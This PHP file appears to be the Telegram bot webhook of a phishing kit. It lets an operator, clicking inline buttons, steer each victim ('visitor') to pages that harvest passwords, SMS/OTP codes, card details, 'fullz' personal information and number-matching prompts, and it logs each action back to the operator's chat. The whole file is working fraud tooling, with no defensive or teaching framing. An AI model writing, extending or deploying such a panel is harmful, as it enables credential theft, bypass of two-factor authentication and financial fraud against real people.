<?php
// Include configuration and database helper
require_once(__DIR__ . '/config.php');
require_once(__DIR__ . '/session/database.php');

// Get the raw POST data
$input = file_get_contents('php://input');
$update = json_decode($input, true);

if (!$update) {
    error_log("No update received or invalid JSON");
    die();
}

error_log("Telegram webhook received: " . $input);

// Handle callback queries (button clicks)
if (isset($update['callback_query'])) {
    $callback_query = $update['callback_query'];
    $chat_id = $callback_query['message']['chat']['id'];
    $message_id = $callback_query['message']['message_id'];
    $callback_id = $callback_query['id'];
    $data = $callback_query['data'];

    // Extract visitor ID from message text using regex
    // Support multiple formats including hex and test IDs
    if (preg_match('/Visitor ID: ([\w\-]+)/', $callback_query['message']['text'], $matches)) {
        $visitor_id = $matches[1];
    } else {
        error_log("No visitor ID found in message text. Trying raw search...");
        // Fallback: search for any sequence that looks like a visitor ID if the label was missed
        if (preg_match('/([a-f0-9]{32,64})/', $callback_query['message']['text'], $matches)) {
            $visitor_id = $matches[1];
        } else {
            error_log("No visitor ID found in message: " . $callback_query['message']['text']);
        
        // Answer anyway so the spinner stops
        $answer = [
            'callback_query_id' => $callback_id,
            'text' => "⚠️ Error: Visitor ID not found in message",
            'show_alert' => true
        ];
        $website = "https://api.telegram.org/bot{$settings['bot_url']}";
        $ch = curl_init($website . '/answerCallbackQuery');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, ($answer));
        curl_exec($ch);
        curl_close($ch);
        die();
        }
    }

    $redirect_url = "";
    $status_label = "";

    // Handle different button clicks
    if (preg_match('/^number_(\d+)$/', $data, $matches)) {
        $number = $matches[1];
        $redirect_url = "prompt-numb.php?id=" . $visitor_id . "&number=" . $number;
        $status_label = "📞 Number Prompt #" . $number;
    } else {
        switch($data) {
            case 'number_prompt':
                // Special case: Update keyboard to show number selection
                $numbers = [];
                for ($i = 1; $i <= 50; $i++) {
                    $row[] = ['text' => $i, 'callback_data' => 'number_' . $i];
                    if (count($row) == 5) {
                        $numbers[] = $row;
                        $row = [];
                    }
                }
                $numbers[] = [['text' => '↩️ Back', 'callback_data' => 'back_to_main']];
                
                $edit_markup = [
                    'chat_id' => $chat_id,
                    'message_id' => $message_id,
                    'reply_markup' => json_encode(['inline_keyboard' => $numbers])
                ];
                
                $website = "https://api.telegram.org/bot{$settings['bot_url']}";
                $ch = curl_init($website . '/editMessageReplyMarkup');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($edit_markup));
                curl_exec($ch);
                curl_close($ch);
                
                $answer = [
                    'callback_query_id' => $callback_id,
                    'text' => "🔢 Select a number",
                    'show_alert' => false
                ];
                $ch = curl_init($website . '/answerCallbackQuery');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($answer));
                curl_exec($ch);
                curl_close($ch);
                die();

            case 'yes_prompt':
                $redirect_url = "prompt-yes.php?id=" . $visitor_id;
                $status_label = "✅ Yes/No Prompt";
                break;
            case 'wrong_password':
            case 'password_error':
                $redirect_url = "error.php?id=" . $visitor_id;
                $status_label = "❌ Wrong Password";
                break;
            case 'otp1':
            case 'sms1':
                $redirect_url = "auth.php?id=" . $visitor_id;
                $status_label = "🔐 SMS/OTP Page 1";
                break;
            case 'otp2':
            case 'sms2':
                $redirect_url = "erauth.php?id=" . $visitor_id;
                $status_label = "🔐 SMS/OTP Page 2";
                break;
            case 'card':
                $redirect_url = "card.php?id=" . $visitor_id;
                $status_label = "💳 Card Details";
                break;
            case 'fullz':
                $redirect_url = "info.php?id=" . $visitor_id;
                $status_label = "📝 Personal Info";
                break;
            case 'security_preference':
                $redirect_url = "select.php?id=" . $visitor_id;
                $status_label = "🔒 Security Preference";
                break;
            case 'success':
                $redirect_url = "unsupported.html";
                $status_label = "🚫 Unsupported";
                break;
            case 'block':
                $redirect_url = "blocked.php?id=" . $visitor_id;
                $status_label = "🚫 Blocked";
                break;
            default:
                error_log("Unknown callback data: " . $data);
                die();
        }
    }

    // Update database using centralized helper
    if (!empty($redirect_url)) {
        $update_success = db_update_visitor($visitor_id, [
            'status' => 'ready',
            'redirect_url' => $redirect_url
        ]);

        if ($update_success) {
            error_log("Updated redirect for visitor: " . $visitor_id . " to: " . $redirect_url);

            // Send notification message
            $notify_msg = "🔵 <b>ACTION EXECUTED</b>\n\n";
            $notify_msg .= "• Action: <code>{$status_label}</code>\n";
            $notify_msg .= "• Visitor ID: <code>{$visitor_id}</code>\n";
            $notify_msg .= "• Time: " . date('Y-m-d H:i:s') . "\n";

            $send = [
                'chat_id' => $settings['chat_id'],
                'text' => $notify_msg,
                'parse_mode' => 'HTML',
                'disable_web_page_preview' => true
            ];

            $website = "https://api.telegram.org/bot{$settings['bot_url']}";
            $ch = curl_init($website . '/sendMessage');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
            curl_exec($ch);
            curl_close($ch);
            
            // Update original message
            // Escape the plain text back to HTML entities to prevent parse errors
            $safe_original_text = htmlspecialchars($callback_query['message']['text'], ENT_QUOTES | ENT_HTML5, 'UTF-8');
            $new_text = $safe_original_text . "\n\n🔄 Result: <b>{$status_label}</b>\n⏰ Time: " . date('Y-m-d H:i:s');
            $edit_msg = [
                'chat_id' => $chat_id,
                'message_id' => $message_id,
                'text' => $new_text,
                'parse_mode' => 'HTML'
            ];
            $ch = curl_init($website . '/editMessageText');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, ($edit_msg));
            curl_exec($ch);
            curl_close($ch);
        }

        // Answer callback query with POP-UP
        $answer = [
            'callback_query_id' => $callback_id,
            'text' => "✅ Action Set: {$status_label}",
            'show_alert' => true // This creates the Telegram popup
        ];

        $website = "https://api.telegram.org/bot{$settings['bot_url']}";
        $ch = curl_init($website . '/answerCallbackQuery');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, ($answer));
        curl_exec($ch);
        curl_close($ch);
    }
}
 